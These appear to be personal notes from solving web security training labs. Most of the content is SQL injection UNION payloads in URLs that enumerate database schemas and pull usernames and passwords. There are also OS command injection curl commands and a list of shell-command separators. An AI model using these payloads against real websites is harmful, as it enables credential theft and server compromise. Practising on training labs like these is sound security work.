## UNION attacks

https://ace81f321f49cdb0800a8011005e0098.web-security-academy.net/filter?category=Pets%27%20order%20by%202%20--
https://ace81f321f49cdb0800a8011005e0098.web-security-academy.net/filter?category=Pets%27%20union%20select%20username,%20password%20from%20users%20%20--

administrator
fj9so1remafxt4nrjsf2


## Finding columns with a useful data type in an SQL injection UNION attack
https://acbb1f8e1f73055d81b6ae7d003c00c0.web-security-academy.net/filter?category=Pets%27%20union%20select%201234,%20%27ZXmSiR%27,%2011%20--


##SQL injection UNION attack, retrieving data from other tables
https://ac2c1f201fbcdb8a80152ac9005500e7.web-security-academy.net/filter?category=Accessories%27%20union%20select%20username,%20password%20from%20users%20--


##Retrieving multiple values within a single column

https://ac951f5d1fdd3667802a1a9e003e006a.web-security-academy.net/filter?category=Gifts' order by 2 --
https://ac951f5d1fdd3667802a1a9e003e006a.web-security-academy.net/filter?category=Gifts' union select null, 'abcd' --
https://ac951f5d1fdd3667802a1a9e003e006a.web-security-academy.net/filter?category=Gifts%27%20union%20select%20null,%20username%20from%20users%20--
https://ac951f5d1fdd3667802a1a9e003e006a.web-security-academy.net/filter?category=Gifts' union select null, concat(username,' : ', password) from users --



#" SQL injection attack, querying the database type and version on MySQL and Microsoft"

https://acf61fde1f7936fa80ce4335008700a2.web-security-academy.net/filter?category=Gifts%27%20union%20select%20@@version,%20%27bbb%27%20%20%20--%20-

# SQL injection attack, listing the database contents on non-Oracle databases

https://aca31fc41e2eb45f800422aa001b000c.web-security-academy.net/filter?category=Gifts%27%20order%20by%202%20--
https://aca31fc41e2eb45f800422aa001b000c.web-security-academy.net/filter?category=Gifts%27%20union%20select%20%27aaa%27,%20%27bbb%27%20--
https://aca31fc41e2eb45f800422aa001b000c.web-security-academy.net/filter?category=Gifts%27%20union%20select%20%27aaa%27,%20%27bbb%27%20--%20-
https://aca31fc41e2eb45f800422aa001b000c.web-security-academy.net/filter?category=Gifts%27%20union%20select%20TABLE_SCHEMA,%20TABLE_NAME%20from%20%20information_schema.tables%20--%20-
https://aca31fc41e2eb45f800422aa001b000c.web-security-academy.net/filter?category=Gifts%27%20union%20select%20TABLE_SCHEMA,%20TABLE_NAME%20from%20%20information_schema.tables%20%20where%20table_schema=%27public%27--%20-

https://aca31fc41e2eb45f800422aa001b000c.web-security-academy.net/filter?category=Gifts%27%20union%20select%20table_name,%20column_name%20from%20%20information_schema.columns%20%20where%20table_name=%27public%27--%20-

https://aca31fc41e2eb45f800422aa001b000c.web-security-academy.net/filter?category=Gifts%27%20union%20select%20table_name,%20column_name%20from%20information_schema.columns%20where%20table_name=%27users_lxmlwl%27%20--%20-

https://aca31fc41e2eb45f800422aa001b000c.web-security-academy.net/filter?category=Gifts%27%20union%20select%20username_adujgu,%20password_grmyrb%20from%20users_lxmlwl%20--%20-



# SQL injection attack, listing the database contents on Oracle

https://acf51f281fa9db1580678340001f001c.web-security-academy.net/filter?category=abc%27%20union%20select%20%27AAA%27,name%20from%20v$database%20--%20-

==> XE

https://acf51f281fa9db1580678340001f001c.web-security-academy.net/filter?category=abc%27%20union%20select%20%27AAAA%27,%20table_name%20from%20all_tables%20--%20-



https://acf51f281fa9db1580678340001f001c.web-security-academy.net/filter?category=abc%27%20union%20select%20%27AAAA%27,%20column_name%20from%20all_tab_columns%20--%20-



https://acf51f281fa9db1580678340001f001c.web-security-academy.net/filter?category=abc%27%20union%20select%20%27AAAA%27,%20column_name%20from%20all_tab_columns%20where%20table_name=%27USERS_YTPEMD%27%20--%20-


#Recap

Liste des databases 


select SCHEMA_NAME from information_schema.SCHEMATA

Liste des tables

select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA = 'public'

Liste des collones

select COLUMN_NAME  from  information_schema.COLUMNS where TABLE_SCHEMA = 'public' and TABLE_NAME= 'users_uvasmj'


Extraire des données 

select username_caovbm, password_zpmyfn  from users_uvasmj


# OS command injection, simple case

curl https://acd41f201fc5363c80728488007700f8.web-security-academy.net/product?productId=1

curl  -b cookie --data-urlencode "productId=1;whoami" --data-urlencode "storeId=2"  https://acd41f201fc5363c80728488007700f8.web-security-academy.net/product/stock



<form id="feedbackForm" action="/feedback/submit" method="POST" enctype="application/x-www-form-urlencoded">
<input required="" type="hidden" name="csrf" value="mQ2hAvF77Bm15brtahLhslmQc6yfj6yR">
<label>Name:</label>
<input required="" type="text" name="name">
<label>Email:</label>
<input required="" type="email" name="email">
<label>Subject:</label>
<input required="" type="text" name="subject">
<label>Message:</label>
<textarea required="" rows="12" cols="300" name="message"></textarea>
<button class="button" type="submit">
    Submit feedback
</button>
<span id="feedbackResult"></span>
</form>


curl  -c cookie https://aca81f2e1f0838c7806b090b005e00f1.web-security-academy.net/feedback

curl -b cookie --data-urlencode "productId=1;whoami" --data-urlencode "storeId=2"  https://acd41f201fc5363c80728488007700f8.web-security-academy.net/product/stock
||whoami>/var/www/images/whoami.txt||


 &whoami>/var/www/images/whoami.txt& 



 &
 &&
 |
 ||
 ;
 0x0a, \n
 `command`
 $(command)